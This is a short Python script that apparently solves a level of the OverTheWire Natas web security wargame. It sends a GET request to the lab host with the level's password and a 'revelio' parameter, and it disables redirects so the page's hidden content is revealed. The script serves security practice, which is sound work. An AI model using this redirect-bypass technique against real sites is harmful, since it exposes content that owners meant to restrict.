import requests
from requests.auth import HTTPBasicAuth

with requests.Session() as session:
    r = session.get(url = "http://natas22.natas.labs.overthewire.org/", auth=HTTPBasicAuth("natas22","91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"), params="revelio", allow_redirects=False)
    print(r.text)
